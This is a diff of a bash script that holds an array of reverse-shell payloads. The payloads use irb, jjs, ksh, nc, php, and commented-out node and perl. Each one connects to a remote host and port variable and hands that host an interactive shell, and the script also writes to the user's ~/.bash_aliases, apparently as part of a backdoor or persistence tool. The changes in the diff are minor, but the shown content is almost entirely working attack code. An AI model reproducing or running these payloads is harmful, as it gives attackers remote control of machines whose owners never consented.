@@ -97,7 +97,7 @@ then
 	}' >> ~/.bash_aliases
 fi
 
-# Perl and Node are broken; going to fix
+# Perl and Node are broken; going to fix 
 METHODS=(
 	# array entry format = method, eval statement, payload: <- the ":" is important, and the spaces around the commas
 	# method = command that starts the reverse shell
@@ -110,7 +110,7 @@ METHODS=(
 	"irb , echo \\\"require 'socket'\\\" | irb --noecho --noverbose , echo \\\"require 'socket'; exit if fork;c=TCPSocket.new('$RHOST',$RPORT);while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read} end\\\" | irb --noecho --noverbose:"
 	"jjs , echo \"quit()\" > $JJSFILE; jjs $JJSFILE , echo 'var ProcessBuilder = Java.type(\\\"java.lang.ProcessBuilder\\\");var p=new ProcessBuilder(\\\"$SHELL\\\", \\\"-i\\\").redirectErrorStream(true).start();var Socket = Java.type(\\\"java.net.Socket\\\");var s=new Socket(\\\"$RHOST\\\",$RPORT);var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(\\\"java.lang.Thread\\\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs" 
 	"ksh , ksh -c 'exit' , ksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1':"
-	"nc , $(nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null) , nc $RHOST $RPORT -e $SHELL:"
+	"nc , nc -w 1 -lnvp 5253 &> /dev/null & nc 0.0.0.0 5253 &> /dev/null , nc $RHOST $RPORT -e $SHELL:"
 	#"node , node -e 'process.exit(0)' , node -e 'sh = require(\"child_process\").spawn(\"$SHELL\");net.connect(process.env.RPORT, process.env.RHOST, function () {this.pipe(sh.stdin);sh.stdout.pipe(this);sh.stderr.pipe(this);});':"
 	#"perl , perl -e \"use Socket;\" , perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($RPORT,inet_aton($RHOST){open(STDIN,\"\>\&S\");open(STDOUT,\"\>\&S\");open(STDERR,\"\>\&S\");exec(\"$SHELL -i\");};':"
 	"php , php -r 'exit();' , php -r \\\"exec(\\\\\\\"$SHELL -c '$SHELL -i >& /dev/tcp/$RHOST/$RPORT 0>&1'\\\\\\\");\\\":"
